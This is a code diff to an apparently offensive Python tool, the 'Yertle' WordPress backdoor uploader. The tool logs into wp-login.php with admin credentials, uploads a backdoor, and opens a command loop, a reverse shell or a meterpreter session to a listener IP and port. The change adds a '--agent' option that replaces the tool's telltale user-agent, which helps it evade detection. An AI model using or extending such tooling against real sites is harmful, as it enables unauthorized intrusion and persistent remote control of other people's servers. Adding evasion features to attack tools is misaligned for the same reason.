@@ -9,11 +9,11 @@ from string import ascii_lowercase
 __author__ = '(n00py)'
 
 
-def uploadbackdoor(host,username,password,type,verbose):
+def uploadbackdoor(host,username,password,type,verbose, agent):
     if host.endswith('/'):
         host = host[:-1]
     url = host + '/wp-login.php'
-    headers = {'user-agent': 'Yertle backdoor uploader',
+    headers = {'user-agent': agent,
                'Accept-Encoding' : 'none'
     }
     payload = {'log': username,
@@ -187,6 +187,7 @@ def warning():
         return True
     else:
         return False
+
 
 def meterpreter(host,uploaddir):
     ip = raw_input('IP Address: ')
@@ -369,6 +370,7 @@ def main():
     parser.add_argument('-t','--target',help='URL of target', required=True)
     parser.add_argument('-u','--username',help='Admin username', required=False)
     parser.add_argument('-p','--password',help='Admin password', required=False)
+    parser.add_argument('-a', '--agent', help='Custom User Agent', required=False, default='Yertle backdoor uploader')
     parser.add_argument('-li','--ip',help='Listener IP', required=False)
     parser.add_argument('-lp','--port',help='Listener Port', required=False)
     parser.add_argument('-v','--verbose',help=' Verbose output.', required=False, action='store_true')
@@ -381,7 +383,7 @@ def main():
             if args.username is None or args.password is None:
                 print "Username and Password are required"
                 sys.exit()
-            uploaddir = uploadbackdoor(args.target, args.username, args.password, "shell", args.verbose)
+            uploaddir = uploadbackdoor(args.target, args.username, args.password, "shell", args.verbose, args.agent)
         else:
             uploaddir = args.existing
         commandloop(args.target,uploaddir)
@@ -394,7 +396,7 @@ def main():
             if args.username is None or args.password is None:
                 print "Username and Password are required"
                 sys.exit()
-            uploaddir = uploadbackdoor(args.target, args.username, args.password, "reverse", args.verbose)
+            uploaddir = uploadbackdoor(args.target, args.username, args.password, "reverse", args.verbose, args.agent)
         else:
             uploaddir = args.existing
         reverseshell(args.target, args.ip, args.port, uploaddir)
